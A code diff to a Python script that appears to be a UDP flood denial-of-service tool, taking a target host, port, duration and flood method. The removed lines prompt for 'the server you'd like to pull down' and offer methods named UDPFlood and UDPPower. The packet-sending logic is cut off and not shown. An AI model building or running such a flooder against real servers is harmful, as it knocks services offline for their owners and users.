@@ -1,40 +1,14 @@
-from asyncore import loop
-from contextlib import nullcontext
 import sys
 import socket
 import threading
 import time as clock
-from asyncore import loop
 
 host = str(sys.argv[1])
 port = int(sys.argv[2])
 time = int(sys.argv[3])
 method = str(sys.argv[4])
 
-if host == null or port == null or time == null or method == null:
-    setup()
-
 loops = 10000
-
-def setup():
-    global host
-    global port
-    global time
-    global method
-    
-    host = input("[!] Enter the IP of the server you'd like to pull down (127.0.0.1): ")
-    port = input("[!] Enter the Port of the server (80): ")
-    time = input("[!] For how many seconds would you like to keep this server down? (20): ")
-    method = input("[!] What UDP method would you like to use? [UDPMix, UDPFlood, UDPPower] (UDPMix): ")
-
-    if host == null:
-        host = "127.0.0.1"
-    if port == null:
-        port = "80"
-    if time == null:
-        time = "20"
-    if method == null:
-        method = "UDPMix"
 
 def send_packet(amplifier):
     try:
